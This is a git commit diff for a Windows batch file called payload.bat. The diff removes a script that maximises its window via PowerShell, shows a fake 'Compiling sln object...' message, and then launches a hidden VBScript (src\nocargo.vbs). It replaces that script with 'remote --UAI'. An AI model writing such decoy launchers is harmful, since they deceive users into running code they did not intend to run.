ee83e8c02c84b47bf28d700cb45045fced427777
GVIO <ampleevvlad11@gmail.com>
2024-11-21 16:28:22 +0200

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -1,17 +1,2 @@
 @echo off
-@echo off
-powershell -Command "& { $hwnd = Get-Process -id $PID | ForEach-Object { $_.MainWindowHandle }; if ($hwnd) { Add-Type -Name Win32 -Namespace Win32Functions -MemberDefinition ' [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); ' -PassThru | ForEach-Object { $_::ShowWindow($hwnd, 3) } } }"
-echo Compiling sln object...
-timeout /t 10 > null
-if exist C:\Cargo (
-   goto compile
-) else (
-   goto nocargo
-)
-:compile
-
-
-
-:nocargo
-start /MAX /WAIT src\nocargo.vbs
-exit
+remote --UAI
